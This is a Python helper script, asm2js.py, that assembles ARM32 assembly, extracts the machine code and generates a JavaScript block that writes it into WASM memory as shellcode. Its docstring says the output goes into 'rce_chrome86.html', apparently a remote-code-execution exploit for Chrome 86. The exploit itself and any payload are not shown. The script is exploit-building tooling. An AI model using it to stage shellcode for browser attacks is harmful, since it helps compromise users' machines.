#!/usr/bin/env python3
"""
asm2js.py — ARM32 assembly → JavaScript WASM memory pre-fill

Workflow:
  1. Assemble .s file with clang --target=arm-linux-gnueabihf
  2. Extract .text section from ELF
  3. Generate JavaScript IIFE that fills WASM memory with the shellcode

Usage:
  python3 asm2js.py input.s [--output exploit_payload.js]
  python3 asm2js.py input.s --hex-only   # just dump hex words

The generated JS is designed to be pasted into rce_chrome86.html's
IIFE block that pre-fills WASM memory.
"""

import argparse
import struct
import subprocess
import sys
import os
import tempfile


def assemble(input_path, temp_dir):
    """Assemble ARM32 .s file using clang."""
    obj_path = os.path.join(temp_dir, 'shellcode.o')
    cmd = [
        'clang',
        '--target=arm-linux-gnueabihf',
        '-c',
        input_path,
        '-o', obj_path
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Assembly FAILED:\n{result.stderr}", file=sys.stderr)
        sys.exit(1)
    return obj_path


def extract_text(obj_path):
    """Extract .text section from ARM32 ELF using pure Python."""
    with open(obj_path, 'rb') as f:
        data = f.read()

    # Parse ELF32 header
    if data[:4] != b'\x7fELF':
        print("Not an ELF file", file=sys.stderr)
        sys.exit(1)

    e_shoff = struct.unpack('<I', data[32:36])[0]
    e_shentsize = struct.unpack('<H', data[46:48])[0]
    e_shnum = struct.unpack('<H', data[48:50])[0]
    e_shstrndx = struct.unpack('<H', data[50:52])[0]

    # Get section header string table
    shstr_hdr_off = e_shoff + e_shstrndx * e_shentsize
    shstr_hdr = data[shstr_hdr_off : shstr_hdr_off + e_shentsize]
    shstr_off = struct.unpack('<I', shstr_hdr[16:20])[0]
    shstr_sz = struct.unpack('<I', shstr_hdr[20:24])[0]
    shstrtab = data[shstr_off : shstr_off + shstr_sz]

    # Find .text section
    for i in range(e_shnum):
        sh_off = e_shoff + i * e_shentsize
        sh = data[sh_off : sh_off + e_shentsize]
        sh_name_idx = struct.unpack('<I', sh[0:4])[0]
        sh_offset = struct.unpack('<I', sh[16:20])[0]
        sh_size = struct.unpack('<I', sh[20:24])[0]

        name = shstrtab[sh_name_idx:].split(b'\x00')[0].decode()
        if name == '.text':
            text_data = data[sh_offset : sh_offset + sh_size]
            return text_data

    print("No .text section found", file=sys.stderr)
    sys.exit(1)


def disassemble_line(word, offset):
    """Basic ARM32 instruction description (best-effort)."""
    cond = (word >> 28) & 0xF
    cond_str = ['EQ','NE','CS','CC','MI','PL','VS','VC',
                'HI','LS','GE','LT','GT','LE','','NV'][cond]

    # SVC
    if (word & 0x0F000000) == 0x0F000000:
        return f"SVC #{word & 0xFFFFFF}"

    # Branch
    if (word & 0x0E000000) == 0x0A000000:
        link = 'L' if (word >> 24) & 1 else ''
        imm24 = word & 0xFFFFFF
        if imm24 & 0x800000:
            imm24 -= 0x1000000
        target = offset + 8 + (imm24 << 2)
        return f"B{link}{cond_str} 0x{target:X}"

    # Data processing
    if (word & 0x0C000000) == 0x00000000:
        I = (word >> 25) & 1
        opcode = (word >> 21) & 0xF
        S = (word >> 20) & 1
        Rn = (word >> 16) & 0xF
        Rd = (word >> 12) & 0xF
        op_names = ['AND','EOR','SUB','RSB','ADD','ADC','SBC','RSC',
                     'TST','TEQ','CMP','CMN','ORR','MOV','BIC','MVN']
        name = op_names[opcode]
        if I:
            rot = ((word >> 8) & 0xF) * 2
            imm8 = word & 0xFF
            val = (imm8 >> rot) | (imm8 << (32 - rot)) if rot else imm8
            val &= 0xFFFFFFFF
            if opcode in (0xD, 0xF):  # MOV, MVN
                return f"{name} R{Rd}, #0x{val:X}"
            elif opcode in (0xA, 0xB):  # CMP, CMN
                return f"{name} R{Rn}, #0x{val:X}"
            else:
                return f"{name} R{Rd}, R{Rn}, #0x{val:X}"
        else:
            Rm = word & 0xF
            if opcode in (0xD, 0xF):
                return f"{name} R{Rd}, R{Rm}"
            elif opcode in (0xA, 0xB):
                return f"{name} R{Rn}, R{Rm}"
            else:
                return f"{name} R{Rd}, R{Rn}, R{Rm}"

    # Load/Store
    if (word & 0x0C000000) == 0x04000000:
        L = (word >> 20) & 1
        name = 'LDR' if L else 'STR'
        Rd = (word >> 12) & 0xF
        Rn = (word >> 16) & 0xF
        imm = word & 0xFFF
        U = (word >> 23) & 1
        if not U:
            imm = -imm
        return f"{name} R{Rd}, [R{Rn}, #{imm}]"

    # Load/Store Multiple
    if (word & 0x0E000000) == 0x08000000:
        L = (word >> 20) & 1
        Rn = (word >> 16) & 0xF
        reglist = word & 0xFFFF
        regs = []
        for r in range(16):
            if reglist & (1 << r):
                regs.append(['R0','R1','R2','R3','R4','R5','R6','R7',
                             'R8','R9','R10','R11','R12','SP','LR','PC'][r])
        W = (word >> 21) & 1
        wb = '!' if W else ''
        if L and Rn == 13 and W:
            return f"POP {{{','.join(regs)}}}"
        elif not L and Rn == 13 and W:
            return f"PUSH {{{','.join(regs)}}}"
        else:
            name = 'LDM' if L else 'STM'
            return f"{name} R{Rn}{wb}, {{{','.join(regs)}}}"

    # BX
    if (word & 0x0FFFFFF0) == 0x012FFF10:
        Rm = word & 0xF
        return f"BX R{Rm}"

    return f"??? (0x{word:08X})"


def generate_js(text_data, comments=True):
    """Generate JavaScript IIFE for WASM memory pre-fill."""
    words = struct.unpack(f'<{len(text_data) // 4}I', text_data)
    pad = len(text_data) % 4
    if pad:
        # Handle trailing bytes
        remaining = text_data[len(words)*4:]
        last_word = int.from_bytes(remaining.ljust(4, b'\x00'), 'little')
        words = list(words) + [last_word]

    lines = []
    lines.append("    (function() {")
    lines.append("        var w = new Uint32Array(wasm_instance.exports.memory.buffer);")

    for i, word in enumerate(words):
        offset = i * 4
        if comments:
            desc = disassemble_line(word, offset)
            lines.append(f"        w[{i}] = 0x{word:08X}; // +0x{offset:03X}: {desc}")
        else:
            lines.append(f"        w[{i}] = 0x{word:08X};")

    lines.append("    })();")
    return '\n'.join(lines)


def generate_hex(text_data):
    """Generate hex dump with disassembly."""
    words = struct.unpack(f'<{len(text_data) // 4}I', text_data)
    lines = []
    for i, word in enumerate(words):
        offset = i * 4
        desc = disassemble_line(word, offset)
        lines.append(f"+0x{offset:03X}: 0x{word:08X}  {desc}")
    return '\n'.join(lines)


def main():
    parser = argparse.ArgumentParser(description='ARM32 assembly to JavaScript WASM memory pre-fill')
    parser.add_argument('input', help='ARM32 assembly file (.s)')
    parser.add_argument('--output', '-o', help='Output JavaScript file')
    parser.add_argument('--hex-only', action='store_true', help='Dump hex words only')
    parser.add_argument('--no-comments', action='store_true', help='Omit disassembly comments')
    args = parser.parse_args()

    with tempfile.TemporaryDirectory() as temp_dir:
        obj_path = assemble(args.input, temp_dir)
        text_data = extract_text(obj_path)

    print(f"Shellcode: {len(text_data)} bytes ({len(text_data)//4} words)", file=sys.stderr)

    if args.hex_only:
        output = generate_hex(text_data)
    else:
        output = generate_js(text_data, comments=not args.no_comments)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(output + '\n')
        print(f"Written to {args.output}", file=sys.stderr)
    else:
        print(output)


if __name__ == '__main__':
    main()
